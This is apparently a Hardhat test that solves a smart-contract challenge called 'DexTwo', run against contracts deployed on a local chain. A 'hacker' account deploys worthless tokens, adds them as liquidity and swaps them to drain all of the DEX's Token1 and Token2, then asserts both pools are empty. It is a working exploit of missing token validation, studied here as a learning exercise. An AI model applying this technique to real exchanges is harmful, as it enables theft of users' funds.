const { expect } = require("chai");

describe("Dex2", function () {
  it("Hacker should empty token1 and token2 on Dex2", async function () {

    const [deployer, hacker] = await ethers.getSigners();

    const WorthlessToken1 = await ethers.getContractFactory("WorthlessToken", hacker);
    const WorthlessToken2 = await ethers.getContractFactory("WorthlessToken", hacker);
    const Token1 = await ethers.getContractFactory("SwappableTokenTwo", deployer);
    const Token2 = await ethers.getContractFactory("SwappableTokenTwo", deployer);
    const Dex2 = await ethers.getContractFactory("DexTwo", deployer);

    const token1 = await Token1.deploy("Token1", "TKN1", ethers.utils.parseUnits('1000'));
    const token2 = await Token2.deploy("Token2", "TKN2", ethers.utils.parseUnits('1000'));

    const dex2 = await Dex2.deploy(token1.address, token2.address);

    await token1.transfer(hacker.address, ethers.utils.parseUnits('10'));
    await token2.transfer(hacker.address, ethers.utils.parseUnits('10'));

    expect(ethers.utils.formatEther(await token1.balanceOf(hacker.address))).to.equal('10.0');
    expect(ethers.utils.formatEther(await token2.balanceOf(hacker.address))).to.equal('10.0');

    console.log('------------------- INITIAL STATE -------------------\n')

    console.log(`Token1 Hacker Balance: ${ethers.utils.formatEther(await token1.balanceOf(hacker.address))}`)
    console.log(`Token2 Hacker Balance: ${ethers.utils.formatEther(await token2.balanceOf(hacker.address))}`)

    await token1.transfer(dex2.address, ethers.utils.parseUnits('100'));
    await token2.transfer(dex2.address, ethers.utils.parseUnits('100'));

    console.log(`\nToken1 Dex2 Balance: ${ethers.utils.formatEther(await token1.balanceOf(dex2.address))}`)
    console.log(`Token2 Dex2 Balance: ${ethers.utils.formatEther(await token2.balanceOf(dex2.address))}`)

    expect(ethers.utils.formatEther(await token1.balanceOf(dex2.address))).to.equal('100.0');
    expect(ethers.utils.formatEther(await token2.balanceOf(dex2.address))).to.equal('100.0');

    const worthlessToken1 = await WorthlessToken1.deploy("WorthlessToken1", "WTKN1", ethers.utils.parseUnits('200'));
    const worthlessToken2 = await WorthlessToken2.deploy("WorthlessToken2", "WTKN2", ethers.utils.parseUnits('200'));

    let hacker_balance_wtkn1 = ethers.utils.formatEther(await worthlessToken1.balanceOf(hacker.address));
    let hacker_balance_wtkn2 = ethers.utils.formatEther(await worthlessToken2.balanceOf(hacker.address));

    expect(hacker_balance_wtkn1).to.equal('200.0');
    expect(hacker_balance_wtkn2).to.equal('200.0');

    await worthlessToken1.approve(dex2.address, ethers.utils.parseUnits('200'));
    await worthlessToken2.approve(dex2.address, ethers.utils.parseUnits('200'));

    await dex2.connect(hacker).add_liquidity(worthlessToken1.address, ethers.utils.parseUnits('100'));
    await dex2.connect(hacker).add_liquidity(worthlessToken2.address, ethers.utils.parseUnits('100'));

    await dex2.connect(hacker).swap(worthlessToken1.address, token1.address, ethers.utils.parseUnits('100'));
    await dex2.connect(hacker).swap(worthlessToken2.address, token2.address, ethers.utils.parseUnits('100'));

    console.log('------------------- STATE BEFORE HACK -------------------\n')

    expect(ethers.utils.formatEther(await token1.balanceOf(hacker.address))).to.equal('110.0');
    expect(ethers.utils.formatEther(await token2.balanceOf(hacker.address))).to.equal('110.0');

    expect(ethers.utils.formatEther(await token1.balanceOf(dex2.address))).to.equal('0.0');
    expect(ethers.utils.formatEther(await token2.balanceOf(dex2.address))).to.equal('0.0');

    console.log(`Token1 Hacker Balance: ${ethers.utils.formatEther(await token1.balanceOf(hacker.address))}`)
    console.log(`Token2 Hacker Balance: ${ethers.utils.formatEther(await token2.balanceOf(hacker.address))}`)

    console.log(`\nToken1 Dex2 Balance: ${ethers.utils.formatEther(await token1.balanceOf(dex2.address))}`)
    console.log(`Token2 Dex2 Balance: ${ethers.utils.formatEther(await token2.balanceOf(dex2.address))}`)
  });
});
